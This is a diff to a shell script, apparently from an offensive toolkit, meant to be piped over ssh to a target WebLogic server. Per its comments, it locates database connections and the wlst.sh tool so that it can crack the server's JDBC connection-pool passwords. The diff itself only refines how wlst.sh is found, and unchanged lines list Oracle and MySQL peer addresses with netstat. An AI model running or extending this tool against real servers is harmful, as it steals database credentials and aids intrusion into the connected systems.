@@ -2,6 +2,13 @@
 # ssh -i YouKey userName@YouTargetIp -p targetPort < oneKeyGetSshWeblogicJdbcPswd.sh >out.txt
 # https://github.com/hktalent/myhktools 
 set +e
+
+
+if [ "${WL_HOME}" != "" ];
+then
+   wlst=(${WL_HOME})
+fi
+
 echo "查找数据库连接"
 netstat -antp|grep ":1521"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):1521"|sort -u
 netstat -antp|grep ":3306"|grep -Eo "([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):3306"|sort -u
@@ -21,17 +28,20 @@ then
   cd "user_projects";
   cd "domains";
   sdomain=`pwd`
-  wlst=(`echo ${sdomain}|sed 's/^\///g'|sed 's/\/.*//g'|xargs -I %  find /% -type f -name "wlst.sh"|sort -u`)
+  if [ "${wlst}" = "" ];
+  then
+    wlst=(`echo ${sdomain}|sed 's/^\///g'|sed 's/\/.*//g'|xargs -I %  find /% -type f -name "wlst.sh"|sort -u`)
+  fi
 fi
 
 # 精准找到wlst.*， 用于破解jdbc连接池密码
 if [ "${wlst}" = "" ];
 then
-   wlst=`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`
+   wlst=(`echo ${sdomain}|sed 's/\/server.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`)
 fi
 if [ "${wlst}" = "" ];
 then
-   wlst=`echo ${sdomain}|sed 's/\/user_projects.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`
+   wlst=(`echo ${sdomain}|sed 's/\/user_projects.*//g'|xargs -I {}  find {} -type f -name "wlst.sh"|sort -u`)
 fi
 
 sdomain=`echo ${sdomain}|sed 's/domain\/.*$/domain/g'`
